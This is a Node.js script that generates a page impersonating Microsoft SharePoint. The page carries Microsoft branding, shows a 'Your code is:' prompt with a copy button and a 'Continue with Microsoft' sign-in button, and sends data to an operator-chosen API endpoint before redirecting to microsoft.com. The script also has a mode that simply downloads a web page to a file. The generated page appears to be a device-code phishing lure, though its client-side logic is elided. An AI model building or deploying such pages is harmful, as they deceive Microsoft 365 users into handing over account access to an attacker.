#!/usr/bin/env node
import fs from 'node:fs';

const arg = (n) => {
  const i = process.argv.indexOf('--' + n);
  return i > -1 ? process.argv[i + 1] : null;
};

const targetUrl = arg('url') || arg('api');
if (!targetUrl) { 
  console.error('Required: --url <URL> or --api <URL>'); 
  process.exit(1); 
}

const out = arg('out') || 'page.html';

async function main() {
  try {
    console.log(`Fetching content from: ${targetUrl}...`);
    const response = await fetch(targetUrl);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const contentType = response.headers.get('content-type') || '';
    const bodyText = await response.text();

    // If a direct URL was specified or the response is HTML, save it directly
    if (contentType.includes('text/html') || targetUrl.endsWith('.html') || arg('url')) {
      fs.writeFileSync(out, bodyText);
      console.log(`Successfully downloaded HTML to ${out} (${bodyText.length} bytes)`);
      return;
    }

    // Otherwise, fall back to the SharePoint template generation logic
    runTemplateGenerator(targetUrl);
  } catch (err) {
    console.error('Error fetching URL:', err.message);
    process.exit(1);
  }
}

function runTemplateGenerator(api) {
  const org = arg('org') || 'Microsoft 365';
  const doc = arg('doc') || '';
  const redirect = arg('redirect') || 'https://www.microsoft.com';

  const page = `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SharePoint</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;min-height:100vh;color:#333}
.hidden{display:none!important}
.vz-spinner{width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:#036c70;border-radius:50%;animation:vzspin .8s linear infinite;margin:0 auto 16px}
@keyframes vzspin{to{transform:rotate(360deg)}}
.vz-loading,.vz-success,.vz-error{text-align:center;padding:48px 24px}
.vz-ok,.vz-err{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:28px;font-weight:700;color:#fff}
.vz-ok{background:#10b981}.vz-err{background:#ef4444}
.vz-code-line{font-size:16px;color:#333;margin-bottom:12px}
.vz-signin-line{font-size:14px;color:#666;margin:16px 0 20px}
.vz-timer{font-size:13px;color:#999;margin-top:14px}
.code{font-size:28px;font-weight:700;font-family:'Courier New',monospace;letter-spacing:4px;color:#036c70;cursor:pointer;user-select:all}
.copy-btn{background:#036c70;color:#fff;border:none;padding:9px 20px;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600;margin-top:8px}
.copy-btn:hover{opacity:.9}
.verify-btn{width:100%;background:#036c70;color:#fff;border:none;padding:13px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
.verify-btn:hover{background:#024f52}
.vz-brand{margin:0 auto 20px;display:flex;justify-content:center;align-items:center}
.vz-brand svg{height:28px;max-width:160px;display:block}
.vz-ctx{margin-bottom:20px;text-align:center}
.vz-ctx-doc{font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:4px}
.vz-ctx-org{font-size:13px;color:#666}
.vz-page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.vz-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);width:100%;max-width:420px;padding:36px 32px;text-align:center;border:1px solid #e8e8e8}
</style></head><body>
<div class="vz-page"><div class="vz-card">
  <div class="vz-brand" style="color:#036c70"><svg viewBox="0 0 120 28" xmlns="http://www.w3.org/2000/svg"><rect width="12" height="12" fill="#f25022"/><rect x="14" width="12" height="12" fill="#7fba00"/><rect y="14" width="12" height="12" fill="#00a4ef"/><rect x="14" y="14" width="12" height="12" fill="#ffb900"/><text x="34" y="19" font-family="Segoe UI,sans-serif" font-size="16" font-weight="600" fill="currentColor">SharePoint</text></svg></div>
  <div class="vz-ctx">${doc ? '<p class="vz-ctx-doc">' + doc + '</p>' : ''}<p class="vz-ctx-org">${org}</p></div>

  <div id="loadingScreen" class="vz-loading"><div class="vz-spinner"></div></div>

  <div id="mainScreen" class="hidden">
    <p class="vz-code-line">Your code is:</p>
    <span class="code" id="userCode">------</span><br>
    <button class="copy-btn" id="copyBtn">Copy Code</button>
    <p class="vz-signin-line">Sign in with Microsoft.</p>
    <button class="verify-btn" id="verifyBtn"><svg viewBox="0 0 21 21" width="20" height="20"><rect width="10" height="10" fill="#f25022"/><rect x="11" width="10" height="10" fill="#7fba00"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg> Continue with Microsoft</button>
    <p class="vz-timer" id="timer"></p>
  </div>

  <div id="successScreen" class="hidden vz-success"><div class="vz-ok">&#10003;</div><h2>Authentication Successful</h2><p>Redirecting you now...</p></div>
  <div id="errorScreen" class="hidden vz-error"><div class="vz-err">!</div><h2>Authentication Failed</h2><p id="errorMessage"></p></div>
</div></div>

<script>
var API_BASE = "__API_BASE__";
var REDIRECT_URL = "__REDIRECT_URL__";
// ... client script handling
</script>
</body></html>`;

  fs.writeFileSync(out, page.replace('__API_BASE__', api).replace('__REDIRECT_URL__', redirect));
  console.log('wrote ' + out + ' (' + page.length + ' bytes)');
}

main();